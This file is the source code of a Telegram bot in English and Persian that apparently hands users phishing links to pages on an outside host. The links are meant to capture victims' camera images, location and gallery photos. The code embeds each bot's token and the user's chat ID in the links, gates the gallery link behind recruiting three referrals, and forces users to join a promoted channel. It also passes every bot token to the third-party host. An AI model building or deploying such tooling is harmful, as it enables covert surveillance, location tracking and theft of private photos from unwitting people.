const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');
const isgd = require('isgd');
const { Buffer } = require('buffer');

// Environment Variables
const MONGO_URI = process.env.MONGO_URI;
const OWNER_ID = process.env.OWNER_ID;

if (!MONGO_URI || !OWNER_ID) {
  console.error('Missing environment variables: MONGO_URI or OWNER_ID');
  process.exit(1);
}

// MongoDB Connection
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

// MongoDB Schemas
const BotSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  creatorId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const BotUserSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  userId: { type: String, required: true },
  username: { type: String },
  hasJoined: { type: Boolean, default: false },
  isFirstStart: { type: Boolean, default: true },
  language: { type: String, default: 'en' },
  referredBy: { type: String, default: 'none' },
  referralCount: { type: Number, default: 0 },
  isVip: { type: Boolean, default: false },
  isBlocked: { type: Boolean, default: false },
  adminState: { type: String, default: 'none' },
  lastInteraction: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const ChannelSchema = new mongoose.Schema({
  botToken: { type: String, required: true, unique: true },
  mainChannel: { type: String, default: 'https://t.me/Kali_Linux_BOTS' },
  customChannel: { type: String, default: null },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
const Bot = mongoose.model('Bot', BotSchema);
const BotUser = mongoose.model('BotUser', BotUserSchema);
const Channel = mongoose.model('Channel', ChannelSchema);

// Language Translations
const messages = {
  en: {
    selectLanguage: 'Please select your language:\nلطفا زبان مورد نظر خود را انتخاب کنید',
    langEnglish: 'English',
    langPersian: 'Persian (فارسی)',
    joinMessage: 'Please join our channel(s) to proceed:',
    joinMainChannel: 'Join Main Channel',
    joinCustomChannel: 'Join Custom Channel',
    joinedButton: 'I Have Joined',
    welcome: (username) => `Welcome, ${username}! Use the menu below to interact with the bot.`,
    menu: {
      camera: 'Camera',
      location: 'Location',
      gallery: 'Gallery',
      language: 'Language 🌐',
    },
    cameraMessage: (url) => `*Hi* how are you this is your Camera link\n${url}`,
    locationMessage: (url) => `*Hi* my dear best friends this is your location link\n${url}`,
    galleryLocked: (current, link) =>
      `*Hi* you have not enough invites to access it your total invite: ${current}\nyour invite link: ${link}`,
    galleryMessage: (url) => `*Hi* bei This is your gallery URL\n${url}`,
    backToMenu: 'Back to Menu ↩️',
    banned: 'You are banned from using this bot.',
    adminPanel: 'Admin Panel',
    adminMenu: {
      stats: '📊 Statistics',
      broadcast: '📍 Broadcast',
      setChannel: '🔗 Set Channel URL',
      blockUser: '🚫 Block',
      unblockUser: '🔓 Unlock',
      back: '↩️ Back',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 Statistics for @${username}\n\n` +
      `👥 Total Users: ${totalUsers}\n` +
      `📅 Bot Created: ${createdAt}\n` +
      `🔗 Main Channel URL: ${mainChannel}\n` +
      (customChannel ? `🔗 Custom Channel URL: ${customChannel}` : '🔗 Custom Channel URL: Not set'),
    broadcastPrompt: (totalUsers) => `📢 Send your message or content to broadcast to ${totalUsers} users:`,
    broadcastSuccess: (success, failed) => `📢 Broadcast completed!\n✅ Sent to ${success} users\n❌ Failed for ${failed} users`,
    broadcastCancel: '↩️ Broadcast cancelled.',
    setChannelPrompt: (mainChannel, customChannel) =>
      `🔗 Main Channel URL (Constant):\n${mainChannel}\n\n` +
      `🔗 Custom Channel URL:\n${customChannel || 'Not set'}\n\n` +
      `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel or @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ Custom Channel URL has been set to:\n${url}\nThe main channel URL remains:\n${mainChannel}`,
    invalidChannel: '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel or @your_channel).',
    blockPrompt: '🚫 Enter the user ID of the account you want to block from this bot:',
    blockSuccess: (userId) => `✅ User ${userId} has been blocked from this bot.`,
    unblockPrompt: '🔓 Enter the user ID of the account you want to unblock from this bot:',
    unblockSuccess: (userId) => `✅ User ${userId} has been unblocked from this bot.`,
    userNotFound: '❌ User not found in this bot.',
    invalidUserId: '❌ Invalid user ID. Please provide a numeric user ID (only numbers).',
    cannotBlockSelf: '❌ You cannot block yourself.',
    cancel: 'Cancel',
    back: '↩️ Back',
    error: '❌ An error occurred. Please try again.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `New User Joined!\n` +
      `Username: ${username}\n` +
      `User ID: ${userId}\n` +
      `Referred By: ${referredBy}\n` +
      `Total Users: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} joined using your link! Your total invites: ${total}`,
  },
  fa: {
    selectLanguage: 'لطفاً زبان خود را انتخاب کنید:\nPlease choose your language',
    langEnglish: 'انگلیسی',
    langPersian: 'فارسی',
    joinMessage: 'لطفاً برای ادامه به کانال(های) ما بپیوندید:',
    joinMainChannel: 'پیوستن به کانال اصلی',
    joinCustomChannel: 'پیوستن به کانال سفارشی',
    joinedButton: 'پیوستم',
    welcome: (username) => `خوش آمدید، ${username}! از منوی زیر استفاده کنید.`,
    menu: {
      camera: 'دوربین',
      location: 'موقعیت',
      gallery: 'گالری',
      language: 'زبان 🌐',
    },
    cameraMessage: (url) => `*سلام* چطور هستید این لینک دوربین شماست\n${url}`,
    locationMessage: (url) => `*سلام* دوستان عزیزم این لینک موقعیت شماست\n${url}`,
    galleryLocked: (current, link) =>
      `*سلام* شما دعوت کافی برای دسترسی ندارید، تعداد دعوت‌های شما: ${current}\nلینک دعوت شما: ${link}`,
    galleryMessage: (url) => `*سلام* بی این لینک گالری شماست\n${url}`,
    backToMenu: 'بازگشت به منو ↩️',
    banned: 'شما از استفاده از این ربات محروم شده‌اید.',
    adminPanel: 'پنل مدیریت',
    adminMenu: {
      stats: '📊 آمار',
      broadcast: '📍 پخش پیام',
      setChannel: '🔗 تنظیم آدرس کانال',
      blockUser: '🚫 مسدود کردن',
      unblockUser: '🔓 رفع مسدودیت',
      back: '↩️ بازگشت',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 آمار برای @${username}\n\n` +
      `👥 تعداد کاربران: ${totalUsers}\n` +
      `📅 تاریخ ایجاد ربات: ${createdAt}\n` +
      `🔗 آدرس کانال اصلی: ${mainChannel}\n` +
      (customChannel ? `🔗 آدرس کانال سفارشی: ${customChannel}` : '🔗 آدرس کانال سفارشی: تنظیم نشده'),
    broadcastPrompt: (totalUsers) => `📢 پیام یا محتوای خود را برای پخش به ${totalUsers} کاربر ارسال کنید:`,
    broadcastSuccess: (success, failed) => `📢 پخش پیام انجام شد!\n✅ ارسال به ${success} کاربر\n❌ ناموفق برای ${failed} کاربر`,
    broadcastCancel: '↩️ پخش پیام لغو شد.',
    setChannelPrompt: (mainChannel, customChannel) =>
      `🔗 آدرس کانال اصلی (ثابت):\n${mainChannel}\n\n` +
      `🔗 آدرس کانال سفارشی:\n${customChannel || 'تنظیم نشده'}\n\n` +
      `آدرس کانال سفارشی را برای افزودن به عنوان دکمه دوم پیوست وارد کنید (مثال: https://t.me/your_channel یا @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ آدرس کانال سفارشی تنظیم شد به:\n${url}\nآدرس کانال اصلی همچنان:\n${mainChannel}`,
    invalidChannel: '❌ آدرس نامعتبر است. لطفاً یک آدرس کانال تلگرام معتبر وارد کنید (مثال: https://t.me/your_channel یا @your_channel).',
    blockPrompt: '🚫 شناسه کاربری حسابی که می‌خواهید از این ربات مسدود کنید را وارد کنید:',
    blockSuccess: (userId) => `✅ کاربر ${userId} از این ربات مسدود شد.`,
    unblockPrompt: '🔓 شناسه کاربری حسابی که می‌خواهید از این ربات رفع مسدودیت کنید را وارد کنید:',
    unblockSuccess: (userId) => `✅ کاربر ${userId} از این ربات رفع مسدودیت شد.`,
    userNotFound: '❌ کاربر در این ربات یافت نشد.',
    invalidUserId: '❌ شناسه کاربری نامعتبر است. لطفاً یک شناسه کاربری عددی وارد کنید (فقط اعداد).',
    cannotBlockSelf: '❌ شما نمی‌توانید خودتان را مسدود کنید.',
    cancel: 'لغو',
    back: '↩️ بازگشت',
    error: '❌ خطایی رخ داد. لطفاً دوباره امتحان کنید.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `کاربر جدید پیوست!\n` +
      `نام کاربری: ${username}\n` +
      `شناسه کاربر: ${userId}\n` +
      `معرفی شده توسط: ${referredBy}\n` +
      `تعداد کل کاربران: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} با لینک شما پیوست! تعداد دعوت‌های شما: ${total}`,
  },
};

// Keyboards
const languageKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: messages[lang].langEnglish, callback_data: 'lang_en' },
        { text: messages[lang].langPersian, callback_data: 'lang_fa' },
      ],
    ],
  },
});

const joinKeyboard = (lang, mainChannel, customChannel) => {
  const keyboard = [
    [{ text: messages[lang].joinMainChannel, url: mainChannel }],
  ];
  if (customChannel) {
    keyboard.push([{ text: messages[lang].joinCustomChannel, url: customChannel }]);
  }
  keyboard.push([{ text: messages[lang].joinedButton, callback_data: 'joined' }]);
  return { reply_markup: { inline_keyboard: keyboard } };
};

const mainMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [{ text: messages[lang].menu.camera, callback_data: 'menu_camera' }],
      [{ text: messages[lang].menu.location, callback_data: 'menu_location' }],
      [{ text: messages[lang].menu.gallery, callback_data: 'menu_gallery' }],
      [{ text: messages[lang].menu.language, callback_data: 'menu_language' }],
    ],
  },
});

const backToMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [{ text: messages[lang].backToMenu, callback_data: 'back_to_menu' }],
    ],
  },
});

const adminMenuKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [
        { text: messages[lang].adminMenu.stats },
        { text: messages[lang].adminMenu.broadcast },
      ],
      [
        { text: messages[lang].adminMenu.setChannel },
        { text: messages[lang].adminMenu.blockUser },
      ],
      [
        { text: messages[lang].adminMenu.unblockUser },
        { text: messages[lang].adminMenu.back },
      ],
    ],
    resize_keyboard: true,
  },
});

const cancelKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].cancel }],
    ],
    resize_keyboard: true,
  },
});

// Helper Functions
const getFormattedDate = (timestamp) => {
  const date = new Date(timestamp * 1000);
  return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
};

const shortenUrl = async (longUrl, chatId, type) => {
  // Determine the prefix based on the type (camera, location, gallery)
  let prefix = '';
  if (type === 'camera') prefix = '1';
  else if (type === 'location') prefix = '2';
  else if (type === 'gallery') prefix = '3';

  // Create the custom slug using the prefix and chatId
  const customSlug = `${prefix}${chatId}`;

  // First, try the new Ashlynn API
  let ashlynnShortUrl = '';
  try {
    const response = await fetch(
      `https://api.ashlynn-repo.tech/short?url=${encodeURIComponent(longUrl)}&slug=${customSlug}`,
      { method: 'GET' }
    );
    const data = await response.json();
    if (data.successful === 'success' && data.status === 200 && data.response && data.response.link) {
      ashlynnShortUrl = data.response.link; // e.g., https://arshorturl.pages.dev/17678944937
    }
  } catch (error) {
    // Silently ignore the error as per your request (no logging or error message)
  }

  // If Ashlynn API succeeded, return the shortened URL
  if (ashlynnShortUrl) {
    return ashlynnShortUrl;
  }

  // Fallback to is.gd if Ashlynn API fails or returns empty
  return new Promise((resolve) => {
    isgd.shorten(longUrl, (shortUrl, error) => {
      if (error) {
        console.error('Error shortening URL with is.gd:', error);
        resolve(longUrl); // If is.gd fails, return the original long URL
      } else {
        resolve(shortUrl); // Return the is.gd shortened URL
      }
    });
  });
};

// Add encodeBase64 function for URL generation with "Ks" appended to bot token
const encodeBase64 = (data, appendKs = false) => {
  if (appendKs) {
    data = data + "Ks"; // Append "Ks" to the bot token before encoding
  }
  return Buffer.from(data).toString('base64');
};

const broadcastMessage = async (bot, message, users, senderId) => {
  let success = 0;
  let failed = 0;

  for (const user of users) {
    if (user.userId === senderId) continue;
    try {
      if (message.text) {
        await bot.telegram.sendMessage(user.userId, message.text);
      } else if (message.photo) {
        await bot.telegram.sendPhoto(user.userId, message.photo[message.photo.length - 1].file_id, {
          caption: message.caption || '',
        });
      } else if (message.document) {
        await bot.telegram.sendDocument(user.userId, message.document.file_id, { caption: message.caption || '' });
      } else if (message.video) {
        await bot.telegram.sendVideo(user.userId, message.video.file_id, { caption: message.caption || '' });
      } else if (message.audio) {
        await bot.telegram.sendAudio(user.userId, message.audio.file_id, { caption: message.caption || '' });
      } else if (message.voice) {
        await bot.telegram.sendVoice(user.userId, message.voice.file_id);
      } else if (message.sticker) {
        await bot.telegram.sendSticker(user.userId, message.sticker.file_id);
      } else {
        await bot.telegram.sendMessage(user.userId, 'Unsupported message type');
      }
      success++;
      await new Promise((resolve) => setTimeout(resolve, 34));
    } catch (error) {
      console.error(`Failed to broadcast to user ${user.userId}:`, error.message);
      failed++;
    }
  }

  return { success, failed };
};

// Main Handler
module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') {
      return res.status(200).send('Bot is running.');
    }

    const botToken = req.query.token;
    if (!botToken) {
      return res.status(400).json({ error: 'Bot token is required.' });
    }

    const botInfo = await Bot.findOne({ token: botToken });
    if (!botInfo) {
      return res.status(404).json({ error: 'Bot not found.' });
    }

    const bot = new Telegraf(botToken);
    const update = req.body;
    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
    const userId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;

    if (!chatId || !userId) {
      return res.status(400).json({ error: 'Invalid update.' });
    }

    // Fetch or create user
    let user = await BotUser.findOne({ botToken, userId });
    if (!user) {
      const username = update.message?.from?.username
        ? `@${update.message.from.username}`
        : update.message.from.first_name || 'User';
      const referredBy = update.message?.text?.startsWith('/start') && update.message.text.includes(' ')
        ? update.message.text.split(' ')[1]
        : 'none';

      user = await BotUser.create({
        botToken,
        userId,
        username,
        hasJoined: false,
        isFirstStart: true,
        language: 'en',
        referredBy,
        referralCount: 0,
        isVip: false,
        isBlocked: false,
        adminState: 'none',
      });

      // Notify admin of new user
      const totalUsers = await BotUser.countDocuments({ botToken });
      const notification = messages['en'].newUserNotification(
        user.username,
        userId,
        user.referredBy,
        totalUsers
      );
      await bot.telegram.sendMessage(botInfo.creatorId, notification);

      // Notify referrer
      if (user.referredBy !== 'none' && /^\d+$/.test(user.referredBy)) {
        const referrer = await BotUser.findOne({ botToken, userId: user.referredBy });
        if (referrer) {
          referrer.referralCount = (referrer.referralCount || 0) + 1;
          await referrer.save();
          const referrerLang = referrer.language || 'en';
          const referralMessage = messages[referrerLang].referralNotification(user.username, referrer.referralCount);
          await bot.telegram.sendMessage(user.referredBy, referralMessage);
        }
      }
    }

    const lang = user.language || 'en';
    user.lastInteraction = Math.floor(Date.now() / 1000);
    await user.save();

    // Check if user is banned (applies to all interactions)
    if (user.isBlocked && userId !== botInfo.creatorId && userId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, messages[lang].banned);
      return res.status(200).json({ ok: true });
    }

    // Fetch channel info
    let channelInfo = await Channel.findOne({ botToken });
    if (!channelInfo) {
      channelInfo = await Channel.create({ botToken });
    }
    const mainChannel = channelInfo.mainChannel;
    const customChannel = channelInfo.customChannel;

    // Handle incoming messages
    if (update.message) {
      const text = update.message.text;

      if (text?.startsWith('/start')) {
        if (user.isFirstStart) {
          await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, languageKeyboard(lang));
          user.isFirstStart = false;
          await user.save();
        } else if (!user.hasJoined) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].joinMessage,
            joinKeyboard(lang, mainChannel, customChannel)
          );
        } else {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].joinMessage,
            joinKeyboard(lang, mainChannel, customChannel)
          );
        }
      }

      else if (text === '/panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'admin_panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].adminMenu.stats) {
          const totalUsers = await BotUser.countDocuments({ botToken });
          const createdAt = getFormattedDate(botInfo.createdAt);
          const stats = messages[lang].statsMessage(
            botInfo.username,
            totalUsers,
            createdAt,
            mainChannel,
            customChannel
          );
          await bot.telegram.sendMessage(chatId, stats, adminMenuKeyboard(lang));
        }

        else if (text === messages[lang].adminMenu.broadcast) {
          const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
          if (totalUsers === 0) {
            await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet.', adminMenuKeyboard(lang));
          } else {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].broadcastPrompt(totalUsers),
              cancelKeyboard(lang)
            );
            user.adminState = 'awaiting_broadcast';
            await user.save();
          }
        }

        else if (text === messages[lang].adminMenu.setChannel) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].setChannelPrompt(mainChannel, customChannel),
            cancelKeyboard(lang)
          );
          user.adminState = 'awaiting_channel';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.blockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].blockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_block';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.unblockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].unblockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_unblock';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.back) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].welcome(user.username),
            mainMenuKeyboard(lang)
          );
          user.adminState = 'none';
          await user.save();
        }
      }

      else if (user.adminState === 'awaiting_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
          const { success, failed } = await broadcastMessage(bot, update.message, targetUsers, userId);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].broadcastSuccess(success, failed),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_channel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        let channelUrl = text.trim();
        channelUrl = channelUrl.replace(/^@/, '');
        channelUrl = channelUrl.replace(/^(https?:\/\/)?/i, '');
        channelUrl = channelUrl.replace(/\/+$/, '');
        if (!/^t\.me\//i.test(channelUrl)) {
          channelUrl = 't.me/' + channelUrl;
        }
        const correctedUrl = 'https://' + channelUrl;

        const urlRegex = /^https:\/\/t\.me\/.+$/;
        if (!urlRegex.test(correctedUrl)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidChannel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          await Channel.findOneAndUpdate({ botToken }, { customChannel: correctedUrl }, { upsert: true });
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].setChannelSuccess(correctedUrl, mainChannel),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_block' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        if (targetUserId === userId) {
          await bot.telegram.sendMessage(chatId, messages[lang].cannotBlockSelf, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          targetUser.isBlocked = true;
          await targetUser.save();
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].blockSuccess(targetUserId),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_unblock' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          targetUser.isBlocked = false;
          await targetUser.save();
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].unblockSuccess(targetUserId),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }
    }

    // Handle callback queries
    if (update.callback_query) {
      // The ban check is already applied above, so blocked users won't reach this point
      const callbackData = update.callback_query.data;
      const callbackQueryId = update.callback_query.id;

      if (callbackData === 'lang_en') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].joinMessage,
          joinKeyboard('en', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_fa') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].joinMessage,
          joinKeyboard('fa', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_en_menu') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].welcome(user.username),
          mainMenuKeyboard('en')
        );
      }

      else if (callbackData === 'lang_fa_menu') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].welcome(user.username),
          mainMenuKeyboard('fa')
        );
      }

      else if (callbackData === 'joined') {
        user.hasJoined = true;
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for joining!');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang)
        );
      }

      else if (callbackData === 'menu_camera') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true); // Append "Ks" before encoding
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'camera');
          await bot.telegram.sendPhoto(
            chatId,
            'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
            {
              caption: messages[lang].cameraMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Camera button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_location') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true); // Append "Ks" before encoding
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'location');
          await bot.telegram.sendPhoto(
            chatId,
            'https://mallucampaign.in/images/img_1709042709.jpg',
            {
              caption: messages[lang].locationMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Location button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_gallery') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const requiredReferrals = 3;
          const userReferrals = user.referralCount || 0;
          if (user.isVip || userReferrals >= requiredReferrals) {
            const encodedBot = encodeBase64(botToken, true); // Append "Ks" before encoding
            const encodedId = Buffer.from(chatId.toString()).toString('base64');
            const longUrl = `https://for-free.serv00.net/helps/index.html?x=${encodedBot}&y=${encodedId}`;
            const shortUrl = await shortenUrl(longUrl, chatId, 'gallery');
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
              {
                caption: messages[lang].galleryMessage(shortUrl),
                parse_mode: 'Markdown',
                reply_markup: backToMenuKeyboard(lang).reply_markup,
              }
            );
          } else {
            const botLink = `https://t.me/${botInfo.username}?start=${userId}`;
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
              {
                caption: messages[lang].galleryLocked(userReferrals, botLink),
                parse_mode: 'Markdown',
                reply_markup: backToMenuKeyboard(lang).reply_markup,
              }
            );
          }
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Gallery button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_language') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, {
          reply_markup: {
            inline_keyboard: [
              [
                { text: messages[lang].langEnglish, callback_data: 'lang_en_menu' },
                { text: messages[lang].langPersian, callback_data: 'lang_fa_menu' },
              ],
            ],
          },
        });
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'back_to_menu') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang)
        );
        await bot.telegram.answerCbQuery(callbackQueryId);
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Error in bot:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};